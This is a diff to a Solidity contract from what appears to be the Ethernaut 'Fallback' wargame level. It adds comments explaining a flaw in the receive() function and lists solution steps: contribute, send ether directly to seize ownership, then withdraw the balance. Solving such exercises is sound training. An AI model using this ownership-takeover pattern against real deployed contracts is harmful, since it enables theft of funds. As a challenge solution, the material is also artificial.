@@ -44,7 +44,15 @@ contract Fallback {
     // Fallback function
     // Anytime ether is sent to this contract without any function specified, it will  transfer to this function
   receive() external payable {
-    require(msg.value > 0 && contributions[msg.sender] > 0);
+    require(msg.value > 0 && contributions[msg.sender] > 0); // by sending eth to this contract, and have contributions > 0, it will make us the owner!)
     owner = msg.sender;
   }
 }
+
+// Solutions
+// 1. Do contributions -> "await contract.contribute({value: 1})"
+// 1a. Check the contract balance first -> "await getBalance(contract.address)" it should show 0.0000000000000001
+// 2. Send external transfer -> "await contract.sendTransaction({value: 100})"
+// 3. Check the owner now -> "await contract.owner()"
+// 4. Check our balance first -> "await getBalance(player)"
+// 5. Withdraw ! -> "await contract.withdraw()"
